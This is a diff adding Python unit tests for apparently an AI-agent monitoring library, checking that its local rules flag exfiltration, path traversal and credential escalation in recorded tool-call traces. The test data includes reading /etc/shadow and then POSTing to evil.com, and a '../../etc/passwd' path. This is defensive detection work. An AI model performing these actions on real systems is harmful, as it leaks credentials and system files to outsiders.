@@ -314,3 +314,123 @@ class TestAgentFingerprint:
         p2 = trace2._build_payload()
 
         assert p.agent_fingerprint != p2.agent_fingerprint
+
+
+class TestLocalEvaluation:
+    """Tests for local rule evaluation in trace.end()."""
+
+    def test_local_eval_no_api_key(self) -> None:
+        """Works without api_key, returns status='evaluated'."""
+        ak = Aktov(agent_id="test", agent_type="summarizer")
+        trace = ak.start_trace()
+        trace.record_action(tool_name="read_file", arguments={"path": "/tmp/safe"})
+        response = trace.end()
+        assert response.status == "evaluated"
+        assert response.rules_evaluated == 3  # bundled samples
+
+    def test_local_eval_exfiltration_alerts(self) -> None:
+        """Exfiltration pattern (read + external network) triggers AK-010."""
+        ak = Aktov(agent_id="test", agent_type="summarizer")
+        trace = ak.start_trace()
+        trace.record_action(
+            tool_name="read_file",
+            arguments={"path": "/etc/shadow"},
+        )
+        trace.record_action(
+            tool_name="http_request",
+            arguments={"url": "https://evil.com", "method": "POST"},
+        )
+        response = trace.end()
+        assert response.status == "evaluated"
+        rule_ids = {a["rule_id"] for a in response.alerts}
+        assert "AK-010" in rule_ids
+
+    def test_local_eval_path_traversal_alerts(self) -> None:
+        """Path traversal triggers AK-032."""
+        ak = Aktov(agent_id="test", agent_type="summarizer")
+        trace = ak.start_trace()
+        trace.record_action(
+            tool_name="read_file",
+            arguments={"path": "../../etc/passwd"},
+        )
+        response = trace.end()
+        rule_ids = {a["rule_id"] for a in response.alerts}
+        assert "AK-032" in rule_ids
+
+    def test_local_eval_credential_escalation(self) -> None:
+        """Non-credential agent accessing credential tool triggers AK-007."""
+        ak = Aktov(agent_id="test", agent_type="summarizer")
+        trace = ak.start_trace()
+        trace.record_action(
+            tool_name="get_secret",
+            tool_category="credential",
+        )
+        response = trace.end()
+        rule_ids = {a["rule_id"] for a in response.alerts}
+        assert "AK-007" in rule_ids
+
+    def test_local_eval_benign_no_alerts(self) -> None:
+        """Clean trace produces zero alerts."""
+        ak = Aktov(agent_id="test", agent_type="summarizer")
+        trace = ak.start_trace()
+        trace.record_action(tool_name="read_file", arguments={"path": "/tmp/safe.txt"})
+        response = trace.end()
+        assert response.alerts == []
+        assert response.rules_evaluated == 3
+
+    def test_local_eval_with_api_key_cloud_down(self) -> None:
+        """When api_key is set but cloud is down, local alerts still returned."""
+        ak = Aktov(
+            api_key="ak_test_key",
+            agent_id="test",
+            agent_type="summarizer",
+            base_url="http://localhost:19999",
+            timeout_ms=100,
+        )
+        trace = ak.start_trace()
+        trace.record_action(
+            tool_name="read_file",
+            arguments={"path": "/etc/shadow"},
+        )
+        trace.record_action(
+            tool_name="http_request",
+            arguments={"url": "https://evil.com", "method": "POST"},
+        )
+        response = trace.end()
+        assert response.status == "evaluated"  # cloud failed, local succeeded
+        assert response.error_code is not None  # cloud error recorded
+        rule_ids = {a["rule_id"] for a in response.alerts}
+        assert "AK-010" in rule_ids  # local alerts still there
+
+    def test_custom_rules_dir(self) -> None:
+        """rules_dir loads custom rules instead of bundled."""
+        import os
+        rules_dir = os.path.join(
+            os.path.dirname(__file__), "..", "src", "aktov", "rules", "samples"
+        )
+        ak = Aktov(
+            agent_id="test",
+            agent_type="summarizer",
+            rules_dir=rules_dir,
+        )
+        trace = ak.start_trace()
+        trace.record_action(tool_name="read_file")
+        response = trace.end()
+        assert response.rules_evaluated == 3  # same 3 sample rules
+
+    def test_alert_dict_structure(self) -> None:
+        """Alert dicts have expected keys."""
+        ak = Aktov(agent_id="test", agent_type="summarizer")
+        trace = ak.start_trace()
+        trace.record_action(
+            tool_name="read_file",
+            arguments={"path": "../../etc/passwd"},
+        )
+        response = trace.end()
+        assert len(response.alerts) > 0
+        alert = response.alerts[0]
+        assert "rule_id" in alert
+        assert "rule_name" in alert
+        assert "severity" in alert
+        assert "category" in alert
+        assert "matched_actions" in alert
